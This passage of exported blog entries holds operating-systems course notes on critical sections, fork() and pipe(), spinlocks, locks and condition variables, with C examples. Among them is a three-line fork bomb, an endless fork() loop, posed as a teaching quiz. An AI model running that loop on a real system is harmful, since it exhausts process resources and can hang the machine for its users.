<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In order to implement the previous example correctly:</p>
<ul>
<li>What is local state private to each thread? <strong>gwaHas</strong></li>
<li>What is the shared state that is being accessed by giveGWATheMoolah? <strong>account</strong></li>
<li>What lines are in the critical section? <strong>2-4</strong></li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/thingsnotgowell.png" alt="things not go well"></p>
<h2 id="Critical-Section-Requirements"><a href="#Critical-Section-Requirements" class="headerlink" title="Critical Section Requirements"></a>Critical Section Requirements</h2><ul>
<li><strong>Mutual Exclusion:</strong> this is the most basic property. Only one thread should be executing in the critical section at one time.</li>
<li><strong>Progress</strong>: all threads should eventually be able to proceed through the critical section.</li>
<li><strong>Performance</strong>: we want to keep critical sections as small as possible without sacrificing correctness.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fork() and pipe()]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-3-fork-and-pipe/</url>
      <content type="html"><![CDATA[<h1 id="fork-and-pipe"><a href="#fork-and-pipe" class="headerlink" title="fork() and pipe()"></a><code>fork()</code> and pipe()</h1><h2 id="Process-Creation"><a href="#Process-Creation" class="headerlink" title="Process Creation"></a>Process Creation</h2><p>Where do processes come from?</p>
<h2 id="fork-create-a-new-process"><a href="#fork-create-a-new-process" class="headerlink" title="fork() create a new process"></a><code>fork()</code> create a new process</h2><p>fork() is the UNIX system call that creates a new process.</p>
<ul>
<li><code>fork()</code> creates a new process that is a <strong>copy</strong> of the calling process.</li>
<li>After <code>fork()</code> we refer to the caller as the <strong>parent</strong> and the newly-created process as the <strong>child</strong>. This relationship enables certain capabilities.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/process_created.png" alt="Create Process"></p>
<h2 id="fork-Semantics"><a href="#fork-Semantics" class="headerlink" title="fork() Semantics"></a><code>fork()</code> Semantics</h2><ul>
<li>Generally <code>fork()</code> tries to make an <strong>exact</strong> copy of the calling process.</li>
<li>Recent version of UNIX have relaxed this requirement and there are now many flavors of <code>fork()</code> that copy different amounts of state and are suitable for different purposes.</li>
<li>For the purposes of this class, ignore them.</li>
<li>Threads are a notable exception!</li>
</ul>
<h2 id="fork-Against-Threads"><a href="#fork-Against-Threads" class="headerlink" title="fork() Against Threads"></a><code>fork()</code> Against Threads</h2><ul>
<li>Single-threaded <code>fork()</code> has reliable semantics because the <strong>only thread</strong> the processes had is the one that called fork().<ul>
<li>So nothing else is happening while we complete the system call.</li>
</ul>
</li>
<li>Multi-threaded <code>fork()</code> creates a host of problems that many systems choose to ignore.<ul>
<li>Linux will only copy state for the thread that called fork().</li>
</ul>
</li>
</ul>
<h2 id="Multi-Threaded-fork"><a href="#Multi-Threaded-fork" class="headerlink" title="Multi-Threaded fork()"></a>Multi-Threaded fork()</h2><p>There are two major problems with multi-threaded fork()</p>
<ol>
<li>Another thread could be blocked in the middle of doing something (uniprocessor systems), or</li>
<li>another thread could be <strong>actually</strong> doing something (multiprocessor systems).</li>
</ol>
<p>This ends up being a big mess. Let’s just copy the calling thread.</p>
<h2 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h2><ol>
<li><code>fork()</code> copies one thread—​the caller.</li>
<li><code>fork()</code> copies the address space.</li>
<li><code>fork()</code> copies the process file table.</li>
</ol>
<p><img src="http://or9a8nskt.bkt.clouddn.com/fork--.png" alt="fork--"></p>
<h2 id="After-fork"><a href="#After-fork" class="headerlink" title="After fork()"></a>After fork()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">returnCode = fork();</span><br><span class="line"><span class="keyword">if</span> (returnCode == <span class="number">0</span>) &#123;</span><br><span class="line">  # I am the child.</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  # I am the parent.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The child thread returns executing at the exact same point that its parent called fork().</p>
<ul>
<li>With one exception: <code>fork()</code> returns <strong>twice</strong>, the PID to the parent and 0 to the child.</li>
<li>All contents of memory in the parent and child are identical.</li>
<li>Both child and parent have the same files open at the same position.<pre><code>* **But, since they are sharing file handles changes to the file offset made by the parent/child will be reflected in the child/parent!**
</code></pre></li>
</ul>
<h2 id="Calm-Like-A-fork-bomb"><a href="#Calm-Like-A-fork-bomb" class="headerlink" title="Calm Like A fork() bomb"></a>Calm Like A fork() bomb</h2><p>What does this code do?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  fork();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Pipes"><a href="#Pipes" class="headerlink" title="Pipes"></a>Pipes</h2><p>Chains of communicating processes can be created by exploiting the <code>pipe()</code> system call.</p>
<ul>
<li><code>pipe()</code> creates an anonymous pipe object and returns a two file descriptors: one for the read-only end, and the other for the write-only end.</li>
<li>Anything written to the write-only end of the pipe is immediately available at the read-only end of the pipe.</li>
<li>Pipe contents are buffered in memory.</li>
<li><strong>Why is this useful?</strong></li>
</ul>
<h2 id="IPC-Using-fork-and-pipe"><a href="#IPC-Using-fork-and-pipe" class="headerlink" title="IPC Using fork() and pipe()"></a>IPC Using <code>fork()</code> and pipe()</h2><ul>
<li>Before calling <code>fork()</code> the parent creates a pipe object by calling <code>pipe()</code>.</li>
<li>Next, it calls fork().</li>
<li>After <code>fork()</code> the parent closes its copy of the read-only end and the child closes its copy of the write-only end.</li>
</ul>
<p>Now the parent can pass information to the child.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/pipe_usage.png" alt="Pipe Usage"></p>
<p><strong>pipeEnds[0] gets the read end; pipeEnds[1] gets the write end.</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># pipeEnds[<span class="number">0</span>] gets the read end; pipeEnds[<span class="number">1</span>] gets the write end.</span><br><span class="line"><span class="keyword">int</span> pipeEnds[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipeEnds);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> returnCode = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (returnCode == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">  # Don't need a loopback.</span><br><span class="line">  close(pipeEnds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  # Read some data from the pipe.</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">14</span>];</span><br><span class="line">  read(pipeEnds[<span class="number">0</span>], data, <span class="number">14</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  # Don't need a loopback.</span><br><span class="line">  close(pipeEnds[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  # Write some data to the pipe.</span><br><span class="line">  write(pipeEnds[<span class="number">1</span>], <span class="string">"Hello, sweet child!\n"</span>, <span class="number">14</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Issues-with-fork"><a href="#Issues-with-fork" class="headerlink" title="Issues with fork()"></a>Issues with fork()</h2><p>Copying all that state is expensive!</p>
<ul>
<li>Especially when the next thing that a process frequently does is to start load a new binary which destroys most of the state <code>fork()</code>    has carefully copied!</li>
</ul>
<p>Several solutions to this problem:</p>
<ul>
<li><strong>Optimize existing semantics</strong>: through copy-on-write, a clever memory-management optimization we will discuss in several weeks.</li>
<li><strong>Change the semantics</strong>: <code>vfork()</code>, which will fail if the child does anything other than immediately load a new executable.<ul>
<li>Does not copy the address space!</li>
</ul>
</li>
</ul>
<p>What if I don’t want to copy all of my process state?</p>
<ul>
<li><code>fork()</code> is now replaced by <code>clone()</code>, a more flexible primitive that enables more control:<pre><code>* over sharing, including sharing memory, and signal handlers,
* and over child execution, which begins at a function pointer passed to the system call instead of resuming at the point where fork()    was called.
</code></pre></li>
<li>Try man clone in your CSE421 VM.</li>
</ul>
<h2 id="The-Tree-of-Life"><a href="#The-Tree-of-Life" class="headerlink" title="The Tree of Life"></a>The Tree of Life</h2><ul>
<li><code>fork()</code> establishes a parent-child relationship between two process at the point when each one is created.</li>
<li>The pstree utility allows you to visualize these relationships.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/pstree.png" alt="pstree"></p>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Synchronization Primitives]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-5-Synchronation-Primitive/</url>
      <content type="html"><![CDATA[<p><strong>Synchronization primitives</strong>(同步原语) are simple software mechanisms provided by a platform (e.g. operating system) to its users for the purposes of supporting thread or process synchronization. They’re usually built using lower level mechanisms (e.g. atomic operations, memory barriers, spinlocks, context switches etc)[1].</p>
<p>primitive or atomic action 是由若干个机器指令构成的完成某种特定功能的一段程序，具有不可分割性·即原语的执行必须是连续的，在执行过程中不允许被中断[2]。</p>
<h2 id="Implementing-Critical-Sections"><a href="#Implementing-Critical-Sections" class="headerlink" title="Implementing Critical Sections"></a>Implementing Critical Sections</h2><ul>
<li><p>Two possible approaches. <strong>Don’t stop</strong>, or <strong>don’t enter</strong>.</p>
</li>
<li><p>On <strong>uniprocessors</strong> a single thread can prevent other threads from executing in a critical section by simply not being descheduled.</p>
<ul>
<li>In the kernel we can do this by <strong>masking</strong> interrupts. No timer, no scheduler, no stopping.</li>
<li><strong>In the multicore era this is only of historical interest</strong>. (This design pattern is usually broken.)</li>
</ul>
</li>
<li>More generally we need a way to force other threads—potentially running on other cores—<strong>not to enter</strong> the critical section while one thread is inside. <strong>How do we do this</strong>?</li>
</ul>
<h2 id="Atomic-Instructions"><a href="#Atomic-Instructions" class="headerlink" title="Atomic Instructions"></a>Atomic Instructions</h2><p>Software synchronization primitives <strong>utilize special hardware instructions</strong> guaranteed to be atomic across all cores:</p>
<ul>
<li><strong>Test-and-set</strong>: write a memory location and return its old value.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">testAndSet</span><span class="params">(<span class="keyword">int</span> * target, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">  oldvalue = *target;</span><br><span class="line">  *target = value;</span><br><span class="line">  <span class="keyword">return</span> oldvalue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Compare-and-swap</strong>: compare the contents of a memory location to a given value. If they are the same, set the variable to a new given value.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compareAndSwap</span><span class="params">(<span class="keyword">int</span> * target, <span class="keyword">int</span> compare, <span class="keyword">int</span> newvalue)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (*target == compare) &#123;</span><br><span class="line">    *target = newvalue;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Load-link and store-conditional</strong>: Load-link returns the value of a memory address, while the following store-conditional succeeds <strong>only if</strong> the value has not changed since the load-link.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">y = <span class="number">1</span>;</span><br><span class="line">__<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">".set push;"</span>     <span class="comment">/* save assembler mode */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">".set mips32;"</span>   <span class="comment">/* allow MIPS32 instructions */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">".set volatile;"</span> <span class="comment">/* avoid unwanted optimization */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"ll %0, 0(%2);"</span>  <span class="comment">/*   x = *sd */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"sc %1, 0(%2);"</span>  <span class="comment">/*   *sd = y; y = success? */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">".set pop"</span>       <span class="comment">/* restore assembler mode */</span></span></span></span><br><span class="line">    : "=r" (x), "+r" (y) : "r" (sd));</span><br><span class="line"><span class="keyword">if</span> (y == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Many processors provide either <strong>test and set</strong> or <strong>compare and swap</strong>.</li>
<li>On others equivalents can be implemented in software using other atomic hardware instructions.</li>
</ul>
<h2 id="The-Bank-Example-Test-and-Set"><a href="#The-Bank-Example-Test-and-Set" class="headerlink" title="The Bank Example: Test and Set"></a>The Bank Example: Test and Set</h2><p>Let’s modify our earlier example to use a test and set:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">int</span> payGWA = <span class="number">0</span>; <span class="comment">// Shared variable for our test and set.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">+ testAndSet(&amp;payGWA, <span class="number">1</span>); # Set the test <span class="keyword">and</span> <span class="built_in">set</span>.</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">+ testAndSet(&amp;payGWA, <span class="number">0</span>); # Clear the test <span class="keyword">and</span> <span class="built_in">set</span>.</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Does this work?</strong> No! How do I tell if another thread has already set payGWA?</p>
<p>Let’s try again:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">int</span> payGWA = <span class="number">0</span>; <span class="comment">// Shared variable for our test and set.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">+ <span class="keyword">if</span> (testAndSet(&amp;payGWA, <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">+   <span class="comment">// But then what?</span></span><br><span class="line">+ &#125;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">+ testAndSet(&amp;payGWA, <span class="number">0</span>); # Clear the test <span class="keyword">and</span> <span class="built_in">set</span>.</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>But what should I do if the payGWA is set?</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">int</span> payGWA = <span class="number">0</span>; <span class="comment">// Shared variable for our test and set.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">+ <span class="keyword">while</span> (testAndSet(&amp;payGWA, <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">+   ; <span class="comment">// Test it again!</span></span><br><span class="line">+ &#125;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">+ testAndSet(&amp;payGWA, <span class="number">0</span>); # Clear the test <span class="keyword">and</span> <span class="built_in">set</span>.</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Busy-Waiting"><a href="#Busy-Waiting" class="headerlink" title="Busy Waiting"></a>Busy Waiting</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/15314088473143.jpg" alt="busy waiting"></p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/whentwothreadsrace.png" alt="whentwothreadsrace"></p>
<h2 id="The-Bank-Example-Test-and-Set-1"><a href="#The-Bank-Example-Test-and-Set-1" class="headerlink" title="The Bank Example: Test and Set"></a>The Bank Example: Test and Set</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> payGWA = <span class="number">0</span>; <span class="comment">// Shared variable for our test and set.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (testAndSet(&amp;payGWA, <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">   ; <span class="comment">// Test it again!</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  testAndSet(&amp;payGWA, <span class="number">0</span>); # Clear the test <span class="keyword">and</span> <span class="built_in">set</span>.</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>What are the <strong>problems</strong> with this approach?</p>
<ul>
<li><strong>Busy waiting</strong>: threads wait for the critical section by “pounding on the door”, executing the TAS repeatedly.</li>
<li>Bad on a multicore system. Worse on a single core system! <strong>Busy waiting prevents the thread in the critical section from making progress!</strong></li>
</ul>
<h2 id="Locks"><a href="#Locks" class="headerlink" title="Locks"></a>Locks</h2><p><strong>Locks</strong> are a synchronization primitive used to implement critical sections.</p>
<ul>
<li>Threads <strong>acquire</strong> a lock when entering a critical section.</li>
<li>Threads <strong>release</strong> a lock when leaving a critical section.</li>
</ul>
<h2 id="Spinlocks"><a href="#Spinlocks" class="headerlink" title="Spinlocks"></a>Spinlocks</h2><p>What we have implemented today is known as a <strong>spinlock</strong>:</p>
<ul>
<li><strong>lock</strong> for the fact that it guards a critical section (we will have more to say about locks next time), and</li>
<li><strong>spin</strong> describing the process of acquiring it.</li>
</ul>
<p>Spinlocks are <strong>rarely used</strong> on their own to solve synchronization problems.</p>
<p>Spinlocks are <strong>commonly used</strong> to build more useful synchronization primitives.</p>
<h2 id="More-Bank-Example"><a href="#More-Bank-Example" class="headerlink" title="More Bank Example"></a>More Bank Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lock gwaWalletLock; <span class="comment">// Need to initialize somewhere</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">giveGWATheMoolah</span><span class="params">(<span class="keyword">account_t</span> account, <span class="keyword">int</span> largeAmount)</span> </span>&#123;</span><br><span class="line">+ lock_acquire(&amp;gwaWalletLock);</span><br><span class="line">  <span class="keyword">int</span> gwaHas = get_balance(account);</span><br><span class="line">  gwaHas = gwaHas + largeAmount;</span><br><span class="line">  put_balance(account, gwaHas);</span><br><span class="line">+ lock_release(&amp;gwaWalletLock);</span><br><span class="line">  notifyGWAThatHeIsRich(gwaHas);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>What happens if we call <code>lock_acquire()</code> while another thread is in the critical section?</p>
<ul>
<li><strong>The thread acquiring the lock must wait until the thread holding the lock calls lock_release()</strong>.</li>
</ul>
<h2 id="How-To-Wait"><a href="#How-To-Wait" class="headerlink" title="How To Wait"></a>How To Wait</h2><p><strong>How</strong> do we wait?</p>
<ul>
<li><strong>Active</strong> (or busy) waiting: repeat some action until the lock is released.</li>
<li><strong>Passive</strong> waiting: tell the kernel what we are waiting for, go to sleep, and rely on <code>lock_release</code> to awaken us.</li>
</ul>
<h2 id="Spinning-v-Sleeping"><a href="#Spinning-v-Sleeping" class="headerlink" title="Spinning v. Sleeping"></a>Spinning v. Sleeping</h2><p>There are cases where spinning is the right thing to do. <strong>When</strong>?</p>
<ul>
<li>Only on multicore systems. Why?<ul>
<li>On single core systems <strong>nothing can change</strong> unless we allow another thread to run!</li>
</ul>
</li>
<li>If the critical section is <strong>short</strong>.<ul>
<li>Balance the length of the <strong>critical section</strong> against the overhead of a <strong>context switch</strong>.</li>
</ul>
</li>
</ul>
<h2 id="When-to-Spin"><a href="#When-to-Spin" class="headerlink" title="When to Spin"></a>When to Spin</h2><p>If the critical section is <strong>short</strong>:<br><img src="http://or9a8nskt.bkt.clouddn.com/whentospin.png" alt="when to spin"></p>
<h2 id="When-to-Sleep"><a href="#When-to-Sleep" class="headerlink" title="When to Sleep"></a>When to Sleep</h2><p>If the critical section is <strong>long</strong>:</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/when_to_sleep.png" alt="when_to_sleep"></p>
<h2 id="How-to-Sleep"><a href="#How-to-Sleep" class="headerlink" title="How to Sleep"></a>How to Sleep</h2><p>The kernel provides functionality allowing kernel threads to sleep and wake on a <strong>key</strong>:</p>
<ul>
<li><code>thread_sleep(key)</code>: “Hey kernel, I’m going to sleep, but please wake me up when key happens.”</li>
<li><code>thread_wake(key)</code>: “Hey kernel, please wake up all (or one of) the threads who were waiting for key.”</li>
<li>Similar functionality can be implemented in user space.</li>
</ul>
<h2 id="Thread-Communication"><a href="#Thread-Communication" class="headerlink" title="Thread Communication"></a>Thread Communication</h2><ul>
<li>Locks are designed to protect <strong>critical sections</strong>.</li>
<li><code>lock_release()</code> can be considered a <strong>signal</strong> from the thread inside the critical section to other threads indicating that they can proceed.<ul>
<li>In order to receive this signal a thread must be sleeping.</li>
</ul>
</li>
<li>What about other kinds of signals that I might want to deliver?<ul>
<li>The buffer has data in it.</li>
<li>Your child has exited.</li>
</ul>
</li>
</ul>
<h2 id="Condition-Variables"><a href="#Condition-Variables" class="headerlink" title="Condition Variables"></a>Condition Variables</h2><p>A <strong>condition variable</strong>(条件变量) is a signaling mechanism allowing threads to:</p>
<ul>
<li><code>cv_wait</code> until a <strong>condition</strong> is true, and</li>
<li><code>cv_notify</code> other threads when the condition becomes true.</li>
</ul>
<p>The <strong>condition</strong> is usually represented as some change to shared state.</p>
<ul>
<li>The buffer has data in it: <strong>bufsize &gt; 0</strong>.</li>
